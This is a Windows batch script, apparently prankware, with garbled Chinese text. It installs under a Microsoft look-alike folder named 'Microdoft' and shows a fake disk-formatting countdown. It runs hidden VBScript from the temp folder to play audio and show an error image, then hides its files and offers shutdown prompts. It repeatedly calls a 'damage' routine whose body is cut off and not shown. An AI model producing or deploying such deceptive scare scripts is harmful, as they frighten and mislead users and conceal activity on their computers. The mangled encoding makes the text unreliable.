@title 
@echo off
>nul chcp 950
if exist "%SystemDrive%\Microdoft" cd /d "%SystemDrive%\Microdoft"
if not "%start%"=="1" goto DO
set Vfile="%SystemDrive%\Microdoft\Md1_0003b.ver"
goto Program start

:DO
set start=1
if exist "%SystemDrive%\Microdoft\DO.bat" (2>&1 call "%SystemDrive%\Microdoft\DO.bat") else (>&2 echo �w�˪��A���~�C & echo  �w�˪��A���~�C>>"%~dp0log.txt" & >nul timeout /t 10 & exit /b)
exit /b
)

:ready
cls & color 2f
call:DT
title �q�����l�{���@%_DoDate%%_DoTime%
set MG=���l�Y�N�}�l
echo %MG%�C
set NT=�uZ�v��--�}�l�F�uX�v��--����
choice /n /t 30 /c zxr /d x /m "%NT%"
if %errorlevel%==3 (
echo %MG% "%NT%"�uR�v>> "%~dp0log.txt"
color 27 & goto restart
)
if %errorlevel%==2 (
echo %MG% "%NT%"�uX�v>> "%~dp0log.txt"
call:boom
color 27 & goto ready
)
if %errorlevel%==1 (
echo %MG% "%NT%"�uZ�v>> "%~dp0log.txt"
color 27 & goto formatting
)

:formatting 
cls
title �{�����椤�K�K Now Running...
echo ���l���K�K
call:DT
echo �b%_DoDate%%_DoTime%�}�l�F���l>>"%~dp0log.txt"
>nul ping /n 1 /w 1000 127.0.0.1
for /L %%A in (1,1,111) do (
cls
echo ���l���K�K%%A�H
>nul ping /-n 1 /w 1000 127.0.0.1
)
cls
echo ���l���K�K65536�H
>nul timeout /t 1 /nobreak
cls
title �q�����l�����@%_DoDate%%_DoTime%
color b0
echo ���l�����A����`�ּ֡I
>nul timeout /t 1 /nobreak
call:DT
echo �b%_DoDate%%_DoTime%�����F���l>>"%~dp0log.txt"
echo ---------------------------------------------------------- >>"%~dp0log.txt"
>nul ping /n 1 /w 1000 127.0.0.1
set script="%temp%\%random%.vbs"
echo Set s= CreateObject("Wscript.Shell") > %script%
if "%ProgramFiles(x86)%"=="" (
echo s.run """%ProgramFiles%\Windows Media Player\wmplayer.exe"" ""%~dp01.mp3""","0" >> %script%
) else (
echo s.run """%ProgramFiles(x86)%\Windows Media Player\wmplayer.exe"" ""%~dp01.mp3""","0" >> %script%
)
echo s.run """%~dp0�t�ο��~.png""","3" >> %script%
echo wscript.sleep 23500 >> %script%
echo s.run "taskkill /f /fi ""windowtitle eq �t�ο��~*""" ,"0" >> %script%
echo s.run "taskkill /f /fi ""windowtitle eq *�t�ο��~*""" ,"0" >> %script%
echo s.run "taskkill /f /fi ""windowtitle eq *�t�ο��~""" ,"0" >> %script%
echo strFile = "%~dp0�t�ο��~.png" >> %script%
echo Set objFSO = CreateObject("Scripting.FileSystemObject") >> %script%
echo Set objFile = objFSO.GetFile(strFile) >> %script%
echo strNewName = Replace(objFile.Name, ".png", "") >> %script%
echo objFSO.MoveFile objFile, "%~dp0" ^& strNewName >> %script%
echo Set objFile = objFSO.GetFile("%~dp0" ^& strNewName) >> %script%
echo If objFile.Attributes XOR 2 Then >> %script%
echo     objFile.Attributes = objFile.Attributes + 2 >> %script%
echo End If >> %script%
echo If objFile.Attributes AND 32 Then >> %script%
echo     objFile.Attributes = objFile.Attributes XOR 32 >> %script%
echo End If >> %script%
echo strFile = "%~dp01.mp3" >> %script%
echo Set objFSO = CreateObject("Scripting.FileSystemObject") >> %script%
echo Set objFile = objFSO.GetFile(strFile) >> %script%
echo strNewName = Replace(objFile.Name, ".mp3", "") >> %script%
echo objFSO.MoveFile objFile, "%~dp0" ^& strNewName >> %script%
echo Set objFile = objFSO.GetFile("%~dp0" ^& strNewName) >> %script%
echo If objFile.Attributes XOR 2 Then >> %script%
echo     objFile.Attributes = objFile.Attributes + 2 >> %script%
echo End If >> %script%
echo If objFile.Attributes AND 32 Then >> %script%
echo     objFile.Attributes = objFile.Attributes XOR 32 >> %script%
echo End If >> %script%
echo wscript.sleep 185000 >> %script%
echo s.run "taskkill /f /fi ""imagename eq wmplayer.exe""" ,"0" >> %script%
set script1="%temp%\%random%a.vbs"
echo Set c= CreateObject^("Wscript.Shell"^) > %script1%
echo c.run ""%script%"","0" >> %script1%
attrib -h "%~dp0�t�ο��~"
attrib -h "%~dp01"
rename "%~dp0�t�ο��~" �t�ο��~.png
rename "%~dp01" 1.mp3
>nul 2>&1 call %script1%
del /f /q %script1%
>nul timeout /t 1 /nobreak
del /f /q %script%
set damage=1
call:damage
goto shutdown choice

:shutdown choice 
cls & color 2f
call:DT
set MG=�q�����l����
title �q�����l�����@%_DoDate%%_DoTime%
set NT=�uZ�v��--�~��F�uX�v��--����
choice /n /t 3 /c zxqr /d x /m "%NT%"
if %errorlevel%==4 (
echo %MG% "%NT%"�uR�v>>"%~dp0log.txt"
shutdown /a
color 27 & goto restart
)
if %errorlevel%==3 (
echo %MG% "%NT%"�uQ�v>>"%~dp0log.txt"
shutdown /a
color 27 & goto shutdown choice
)
if %errorlevel%==2 (
echo %MG% "%NT%"�uX�v>>"%~dp0log.txt"
call:boom
color 27 & goto shutdown choice
)
if %errorlevel%==1 (
cls & color 8f
echo %MG% "%NT%"�uZ�v>>"%~dp0log.txt"
echo �A���C
>nul timeout /t 1 /nobreak
call:DT
set damage=1.5
call:damage
echo ---------------------------------------------------------- >>"%~dp0log.txt"
set damage=2
call:damage
goto :eof
)

:damage
